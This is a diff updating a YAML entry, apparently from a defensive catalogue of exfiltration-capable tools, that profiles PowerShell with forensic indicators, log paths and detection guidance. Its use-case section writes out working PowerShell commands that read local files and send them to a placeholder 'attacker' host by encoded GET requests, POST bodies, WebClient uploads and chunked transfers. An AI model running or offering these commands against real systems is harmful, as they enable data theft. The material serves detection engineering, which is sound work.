@@ -1,9 +1,10 @@
 Name: PowerShell
 Description: >
-  PowerShell is a shell and scripting engine used for administrative automation built into Windows and available for download on macOS and Linux.
-  It supports file manipulation, encoding, HTTP methods, and in-memory execution.
-  Threat actors abuse PowerShell for fileless data exfiltration via chunked uploads, obfuscated scripts,
-  and stealthy communication with C2 endpoints.
+  PowerShell is a command-line shell and scripting engine used for administrative automation,
+  built into Windows and available on macOS and Linux. It provides extensive capabilities for
+  file access, encoding, HTTP communication, and in-memory execution. Threat actors abuse
+  PowerShell for stealthy, fileless data exfiltration using encoded payloads, chunked uploads,
+  and obfuscated scripts that communicate directly with attacker-controlled endpoints.
 Category: native
 Platform:
   - Windows
@@ -12,68 +13,84 @@ Platform:
 Execution:
   - cli
 Capabilities:
-  - http-upload             # Upload files using POST/PUT requests to external servers.
-  - url-encoding            # Encode file contents into URLs to send data via GET.
-  - base64-encoding         # Encode file data to bypass inspection and detection.
-  - fileless-exfiltration   # Executes without writing artifacts to disk.
-  - chunked-upload          # Sends data in multiple parts to evade volume detection.
-  - script-obfuscation      # Scripts can be obfuscated to evade static detection.
-  - living-off-the-land     # Native to Windows; requires no additional software.
+  - http-upload             # Upload data using POST or PUT requests.
+  - url-encoding            # Encode file contents into URLs for GET-based exfiltration.
+  - base64-encoding         # Encode data to bypass inspection or content-based detection.
+  - fileless-exfiltration   # Executes without writing payloads or archives to disk.
+  - chunked-upload          # Splits data into small transfers to evade size-based alerts.
+  - script-obfuscation      # Supports heavy obfuscation to evade static detection.
+  - living-off-the-land     # Native administrative tool requiring no additional binaries.
 Forensics:
   BinaryLocations:
     - C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    - C:\Program Files\PowerShell\7\pwsh.exe
   FileNamePatterns:
     - powershell.exe
     - pwsh.exe
     - powershell_ise.exe
     - powershell.v2.exe
   CommandLineArgs:
-    - Invoke-WebRequest
-    - WebClient
-    - UploadData
-    - -Method
-    - -Body
-    - '[uri]::EscapeDataString'
-    - '[Convert]::ToBase64String'
-    - '[System.IO.File]::ReadAllBytes'
+    Description: PowerShell methods and constructs commonly observed in exfiltration activity.
+    Indicators:
+      - Invoke-WebRequest            # Native cmdlet for HTTP GET/POST requests.
+      - Invoke-RestMethod            # REST-focused HTTP client used for API-style exfiltration.
+      - System.Net.WebClient         # Legacy .NET class frequently abused for uploads.
+      - UploadData                   # Method for POSTing raw byte arrays.
+      - -Method                      # Specifies HTTP method (GET, POST, PUT).
+      - -Body                        # Supplies request body content.
+      - [uri]::EscapeDataString     # URL-encodes data for GET-based exfiltration.
+      - [Convert]::ToBase64String   # Base64-encodes file contents.
+      - [System.IO.File]::ReadAllBytes # Reads files directly into memory.
+  ConfigFiles: []
+  RegistryPersistence: []
   LogFiles:
     - C:\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx
-    - C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
-  ConfigFiles: []
-  ScheduledTask: []
-  RegistryPersistence: []
+    - C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
   NetworkArtifacts:
     Description: >
-      PowerShell-based exfiltration typically leverages HTTP or HTTPS to custom endpoints.
-      These endpoints, domain names, and headers are often attacker-controlled and lack static indicators.
-      As such, no reliable static network indicators are available for Sigma-style detections.
+      PowerShell exfiltration typically uses attacker-controlled HTTP or HTTPS endpoints.
+      Domains, paths, and headers are highly variable and often ephemeral, making static
+      network indicators unreliable for rule-based detection.
     Indicators: []
+  ScheduledTask: []
+NetworkBehavior:
+  Description: >
+    PowerShell-based exfiltration is characterized by direct, script-driven network
+    communication initiated from an interpreter process. Data is often encoded, split
+    into chunks, and transmitted over HTTP or HTTPS to external infrastructure without
+    intermediate tooling or file artifacts.
+  Behaviors:
+    - Outbound HTTP or HTTPS connections initiated directly by powershell.exe or pwsh.exe
+    - Transmission of encoded data (URL-encoded or Base64) in request bodies or parameters
+    - Repeated small network transfers indicative of chunked exfiltration
+    - Script execution without creation of temporary archives or staging files
+    - Use of non-interactive or hidden PowerShell execution contexts
 ThreatActors:
   - ransomware
   - apt
 UseCases:
-  - Title: URL-encoded GET exfil
-    Description: Read content, encode, and send via GET parameter.
+  - Title: URL-encoded GET exfiltration
+    Description: Read file content, URL-encode it, and send via HTTP GET request.
     Command: |
       $data = Get-Content "data.csv" | Out-String
       $encoded = [uri]::EscapeDataString($data)
       Invoke-WebRequest -Uri "http://attacker/exfil?data=$encoded"
-  - Title: Base64-encoded GET exfil
-    Description: Encode file to base64 and send in GET.
+  - Title: Base64-encoded GET exfiltration
+    Description: Encode file content in Base64 and transmit via GET parameter.
     Command: |
       $b64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Content "data.csv" -Raw)))
       Invoke-WebRequest -Uri "http://attacker/exfil?b64=$b64"
   - Title: POST raw file body
-    Description: Upload file via POST request body.
+    Description: Upload file content directly using HTTP POST.
     Command: |
       Invoke-WebRequest -Uri "http://attacker/exfil" -Method POST -Body (Get-Content "data.csv" -Raw)
-  - Title: Byte array upload with WebClient
-    Description: Use WebClient to POST file as bytes.
+  - Title: Byte-array upload using WebClient
+    Description: Read file into memory and upload as raw bytes.
     Command: |
       $bytes = [System.IO.File]::ReadAllBytes("file.zip")
       (New-Object System.Net.WebClient).UploadData("http://attacker/exfil", $bytes)
-  - Title: Chunked GET exfil
-    Description: Split and send base64 file chunks via GET.
+  - Title: Chunked Base64 exfiltration
+    Description: Split Base64 data into small chunks and transmit sequentially.
     Command: |
       $chunks = $b64 -split 500
       for ($i=0; $i -lt $chunks.Length; $i++) {
@@ -83,41 +100,25 @@ UseCases:
 Detection:
   - Type: Suspicious PowerShell Invocation
     Description: >
-      Detect PowerShell executed with flags like `-EncodedCommand`, `-NoProfile`, `-WindowStyle Hidden`, or base64-encoded blobs.
-      These are commonly used in malicious scripts to evade detection or execute payloads without visibility.
-  - Type: HTTP Exfiltration from PowerShell
+      Detect PowerShell execution with flags such as -EncodedCommand, -NoProfile,
+      -WindowStyle Hidden, or long Base64-encoded command lines.
+  - Type: PowerShell Network Activity
     Description: >
-      Monitor PowerShell processes making outbound HTTP/HTTPS connections with POST or GET requests,
-      especially when transmitting base64 data or uploading to suspicious or external domains.
-  - Type: Abnormal PowerShell Parent Process
+      Monitor outbound HTTP/HTTPS connections initiated by PowerShell processes,
+      especially when combined with upload-related cmdlets or .NET networking classes.
+  - Type: Abnormal Parent Process
     Description: >
-      Flag PowerShell launched by unexpected parent processes such as `winword.exe`, `excel.exe`, `onenote.exe`, `outlook.exe`, or `mshta.exe`.
-      This may indicate exfiltration triggered by phishing attachments or LOLBAS methods.
-  - Type: Repeated Small Transfers (Chunked Exfil)
+      Alert when PowerShell is launched by unexpected parents such as winword.exe,
+      excel.exe, outlook.exe, onenote.exe, or mshta.exe.
+  - Type: Chunked Transfer Pattern
     Description: >
-      Detect multiple small HTTP GET/POST requests from the same host/process within a short time window.
-      Used in chunked exfiltration to evade size-based alerts.
-  - Type: Fileless Exfiltration Pattern
+      Detect repeated small network requests originating from PowerShell within
+      a short time window, indicative of chunked exfiltration.
+  - Type: Fileless Exfiltration Behavior
     Description: >
-      Look for PowerShell processes reading file content via `Get-Content`, `ReadAllBytes`, or `ConvertTo-Base64`,
-      then sending it out with `Invoke-WebRequest`, `WebClient`, or `System.Net.HttpClient`.
-      Lack of temp file creation is a red flag.
-  - Type: DNS or Domain Reputation Anomaly
-    Description: >
-      Alert on PowerShell-initiated DNS requests to unusual or low-reputation domains (e.g., tunneling services like ngrok.io, serveo.net)
-      or dynamically generated domains.
-  - Type: PowerShell Upload to Internal Web Service
-    Description: >
-      Flag internal web servers (e.g., with `upload.php`, `api/upload`) receiving HTTP uploads from endpoints
-      using PowerShell with `-Method POST`, `UploadData()`, or suspicious headers like `X-Data`.
-  - Type: Credential Harvesting Precursor
-    Description: >
-      Correlate PowerShell execution with prior access to directories like `AppData\Roaming\AWS`, `.ssh`, or browser credential stores,
-      suggesting exfil of sensitive config or secrets.
-  - Type: Proxy or Tunneling Use
-    Description: >
-      Detect PowerShell scripts using proxy variables or reaching destinations only accessible via reverse tunnels or Tor bridges.
+      Correlate in-memory file reads with immediate outbound network activity
+      without corresponding archive creation or disk staging.
 References:
   - https://unit42.paloaltonetworks.com/vice-society-ransomware-powershell/
   - https://www.elastic.co/guide/en/security/8.9/potential-data-exfiltration-through-powershell.html
-LastModified: '2025-11-17'
+LastModified: '2025-12-12'
